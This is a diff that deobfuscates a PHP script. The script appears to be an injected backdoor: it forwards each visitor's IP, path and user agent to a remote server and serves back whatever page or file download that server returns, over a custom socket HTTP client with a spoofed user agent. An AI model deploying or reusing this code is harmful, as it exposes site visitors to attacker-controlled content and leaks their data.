@@ -39,9 +39,7 @@ function php_display($url) {
     ["ip"] = getIp();
     $query
     ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-    $ {
-        $pzqscfbwfoo
-    }
+    $query
     ["useragent"] = getUseragent();
     $url = $url . "?" . http_build_query($query);
     $ykymhewdris = "content";
@@ -50,30 +48,20 @@ function php_display($url) {
         error_404();
     }
     $wpkyut = "content";
-    $content = explode(" ", $ {
-        $rbdxeeg
-    });
+    $content = explode(" ", $content);
     $pesdfbe = "content";
     $uflmer = "filename";
     $filename = array_shift($content);
-    $content = implode(" ", $ {
-        $wpkyut
-    });
+    $content = implode(" ", $content);
     if (strstr($filename, ".html") === FALSE) {
         $wsluapls = "content";
         $iakxulxikk = "type";
         $ijffdbx = "type";
         $liobqfzecv = "filename";
-        $ {
-            $ijffdbx
-        } = "application/octet-stream";
+        $type = "application/octet-stream";
         header("Content-Type:" . $type);
-        header("Content-Disposition: attachment; filename=" . $ {
-            $liobqfzecv
-        });
-        header("Content-Length: " . strlen($ {
-            $wsluapls
-        }));
+        header("Content-Disposition: attachment; filename=" . $filename);
+        header("Content-Length: " . strlen($content));
     }
     echo $content;
     exit();
@@ -106,33 +94,21 @@ function http_request($params) {
     $flcyorqsb = "timeout";
     $ulvgvufr = "params";
     if (!isset($params
-    ["method"])) $ {
-        $dtizvq
-    }
-    ["method"] = (isset($ {
-        $rjfobnk
-    }
+    ["method"])) $params
+    ["method"] = (isset($params
     ["data"]) && is_array($params
     ["data"])) ? "POST" : "GET";
-    $ {
-        $xlqroqbdsxr
-    }
+    $params
     ["method"] = strtoupper($params
     ["method"]);
     if (!in_array($params
     ["method"], array("GET", "POST"))) return FALSE;
-    $url = parse_url($ {
-        $iygwzasprs
-    }
+    $url = parse_url($params
     ["url"]);
     if (!isset($url
-    ["scheme"])) $ {
-        $fdyymehuojn
-    }
+    ["scheme"])) $url
     ["scheme"] = "http";
-    if (!isset($ {
-        $wywwrkacw
-    }
+    if (!isset($url
     ["path"])) $url
     ["path"] = "/";
     if (!isset($url
@@ -145,15 +121,11 @@ function http_request($params) {
             $lqniscmceeu = "url";
             $url
             ["host"] = substr($url
-            ["path"], 0, strpos($ {
-                $jzjmvnjmjak
-            }
+            ["path"], 0, strpos($url
             ["path"], "/"));
             $url
             ["path"] = substr($url
-            ["path"], strpos($ {
-                $lqniscmceeu
-            }
+            ["path"], strpos($url
             ["path"], "/"));
         } else {
             $url
@@ -170,20 +142,12 @@ function http_request($params) {
     ["path"]);
     $razoyonw = "errno";
     if (isset($url
-    ["query"])) $ {
-        $sxbpdcgbnhv
-    }
+    ["query"])) $url
     ["path"].= "?{$url['query']}";
-    $port = isset($ {
-        $ipttjthk
-    }
+    $port = isset($params
     ["port"]) ? $params
-    ["port"] : (isset($ {
-        $sduxjksgmdh
-    }
-    ["port"]) ? $ {
-        $btcrda
-    }
+    ["port"] : (isset($url
+    ["port"]) ? $url
     ["port"] : ($url
     ["scheme"] == "https" ? 443 : 80));
     $timeout = isset($params
@@ -192,31 +156,19 @@ function http_request($params) {
     $vfxzzxxo = "fp";
     $bqkboh = "url";
     $vmvvwyx = "params";
-    if (!isset($ {
-        $vmvvwyx
-    }
+    if (!isset($params
     ["return"])) $params
     ["return"] = "content";
-    $ {
-        $qqroevys
-    } = $url
+    $scheme = $url
     ["scheme"] == "https" ? "ssl://" : "";
     $fp = @fsockopen($scheme . $url
-    ["host"], $ {
-        $yijslrmkos
-    }, $ {
-        $razoyonw
-    }, $errstr, $ {
-        $flcyorqsb
-    });
+    ["host"], $port, $errno, $errstr, $timeout);
     if ($fp) {
         $tshdxkrjg = "headers";
         $kccwgjcfzry = "params";
         $ahzbto = "request";
         $jrpbrhfchpi = "params";
-        if (!isset($ {
-            $kccwgjcfzry
-        }
+        if (!isset($params
         ["User-Agent"])) $params
         ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
         $pojdifufqxn = "params";
@@ -228,17 +180,13 @@ function http_request($params) {
         $request.= "User-Agent: {$params['User-Agent']}" . " ";
         $bbrvfdiqc = "request";
         $nqdhraem = "data";
-        if (isset($ {
-            $pojdifufqxn
-        }
+        if (isset($params
         ["referer"])) $request.= "Referer: {$params['referer']} ";
         if (isset($params
         ["cookie"])) {
             $dtxmecwodrd = "cookie";
             $djntfik = "cookie";
-            $ {
-                $djntfik
-            } = "";
+            $cookie = "";
             if (is_array($params
             ["cookie"])) {
                 $ycbsvqo = "cookie";
@@ -246,82 +194,50 @@ function http_request($params) {
                 $rqgoxxlohwl = "cookie";
                 $hgtshwshin = "params";
                 $gvqqpvmbynrb = "cookie";
-                foreach ($ {
-                    $hgtshwshin
-                }
+                foreach ($params
                 ["cookie"] as $k => $v) $cookie.= "$k=$v; ";
-                $ {
-                    $rqgoxxlohwl
-                } = substr($ {
-                    $gvqqpvmbynrb
-                }, 0, -2);
+                $cookie = substr($cookie, 0, -2);
             } else $cookie = $params
             ["cookie"];
             if ($cookie != "") $request.= "Cookie: $cookie ";
         }
         $xrpkvnq = "request";
-        $ {
-            $xrpkvnq
-        }.= "Connection: close ";
+        $request.= "Connection: close ";
         if ($params
         ["method"] == "POST") {
             $hppnxos = "params";
             $xfowerivgy = "params";
             $ycvslrfdjhn = "data";
-            if (isset($ {
-                $hppnxos
-            }
-            ["data"]) && is_array($ {
-                $xfowerivgy
-            }
+            if (isset($params
+            ["data"]) && is_array($params
             ["data"])) {
                 $xkhabq = "k";
                 $piwbdshpsstj = "data";
                 $erfrgfxmygs = "data";
                 $lkgftnl = "k";
                 foreach ($params
-                ["data"] AS $ {
-                    $lkgftnl
-                } => $v) $data.= urlencode($k) . "=" . urlencode($v) . "&";
+                ["data"] AS $k => $v) $data.= urlencode($k) . "=" . urlencode($v) . "&";
                 $jtgyocys = "data";
-                if (substr($data, -1) == "&") $ {
-                    $jtgyocys
-                } = substr($data, 0, -1);
+                if (substr($data, -1) == "&") $data = substr($data, 0, -1);
             }
             $data.= "  ";
             $request.= "Content-type: application/x-www-form-urlencoded ";
-            $request.= "Content-length: " . strlen($ {
-                $ycvslrfdjhn
-            }) . " ";
+            $request.= "Content-length: " . strlen($data) . " ";
         }
         $request.= " ";
         if ($params
-        ["method"] == "POST") $request.= $ {
-            $nqdhraem
-        };
+        ["method"] == "POST") $request.= $data;
         $rlmagcoondi = "fp";
-        @fwrite($fp, $ {
-            $bbrvfdiqc
-        });
+        @fwrite($fp, $request);
         $res = "";
-        $ {
-            $tshdxkrjg
-        } = "";
-        $ {
-            $edugfoonj
-        } = false;
+        $headers = "";
+        $h_detected = false;
         while (!@feof($fp)) {
             $fxzuahsbp = "res";
             $egvgmmxsuux = "h_detected";
             $nlsygkhpdyyn = "res";
-            $ {
-                $nlsygkhpdyyn
-            }.= @fread($fp, 1024);
-            if (!$ {
-                $egvgmmxsuux
-            } && strpos($ {
-                $fxzuahsbp
-            }, "  ") !== FALSE) {
+            $res.= @fread($fp, 1024);
+            if (!$h_detected && strpos($res, "  ") !== FALSE) {
                 $gokexypfnnju = "res";
                 $qmvftez = "headers";
                 $sykrwe = "res";
@@ -332,36 +248,22 @@ function http_request($params) {
                 $jqqelrlzroq = "params";
                 $gwoscntyun = "res";
                 $h_detected = true;
-                $ {
-                    $qmvftez
-                } = substr($res, 0, strpos($res, "  "));
+                $headers = substr($res, 0, strpos($res, "  "));
                 $qnwjrwbxalvq = "headers";
                 $wigpbx = "params";
                 $jtjcghsyvtc = "params";
-                $ {
-                    $sykrwe
-                } = substr($res, strpos($res, "  ") + 4);
-                if ($ {
-                    $uflxkry
-                }
-                ["return"] == "headers" || $ {
-                    $jtjcghsyvtc
-                }
+                $res = substr($res, strpos($res, "  ") + 4);
+                if ($params
+                ["return"] == "headers" || $params
                 ["return"] == "array" || (isset($params
                 ["redirect"]) && $params
                 ["redirect"] == true)) {
                     $yjqqdvupnm = "v";
                     $mnbxxtkm = "headers";
                     $dvxenchgyqp = "headers";
-                    $h = explode(" ", $ {
-                        $mnbxxtkm
-                    });
-                    $ {
-                        $dvxenchgyqp
-                    } = array();
-                    foreach ($h as $k => $ {
-                        $yjqqdvupnm
-                    }) {
+                    $h = explode(" ", $headers);
+                    $headers = array();
+                    foreach ($h as $k => $v) {
                         if (strpos($v, ":")) {
                             $ckdqikcutle = "v";
                             $mnmykww = "v";
@@ -375,9 +277,7 @@ function http_request($params) {
                 }
                 if (isset($params
                 ["redirect"]) && $params
-                ["redirect"] == true && isset($ {
-                    $qnwjrwbxalvq
-                }
+                ["redirect"] == true && isset($headers
                 ["LOCATION"])) {
                     $iweqfuxdlggh = "params";
                     $ljrsgsxuvv = "params";
@@ -404,9 +304,7 @@ function http_request($params) {
                 ["return"] == "headers") return $headers;
             }
         }
-        @fclose($ {
-            $qnklxgjjj
-        });
+        @fclose($fp);
     } else return FALSE;
     if ($params
     ["return"] == "array") $res = array("headers" => $headers, "content" => $res);
@@ -425,18 +323,12 @@ function getUseragent() {
 function getReferer() {
     $lfjiopxo = "referer";
     $frohhtuteye = "referer";
-    $ {
-        $frohhtuteye
-    } = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "-";
-    return $ {
-        $lfjiopxo
-    };
+    $referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "-";
+    return $referer;
 }
 function getIp() {
     $zizlckd = "ip";
-    $ {
-        $zizlckd
-    } = NULL;
+    $ip = NULL;
     if (isset($_SERVER["REMOTE_ADDR"])) {
         $ip = $_SERVER["REMOTE_ADDR"];
     }
@@ -446,11 +338,7 @@ function getIp() {
         $mujjczjqc = "ips";
         $vijvmqe = "ip";
         $ips = explode(",", $ip);
-        $ {
-            $vijvmqe
-        } = trim(array_pop($ips));
+        $ip = trim(array_pop($ips));
     }
-    return $ {
-        $ygtqpkoosnxt
-    };
+    return $ip;
 } ?>
